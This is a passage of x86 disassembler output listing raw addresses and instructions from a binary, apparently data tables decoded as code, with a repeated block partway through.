  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    BYTE PTR [ecx+edi*1+0x3],dl
  412427:	add    BYTE PTR [ecx+ebp*1+0x3],dl
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
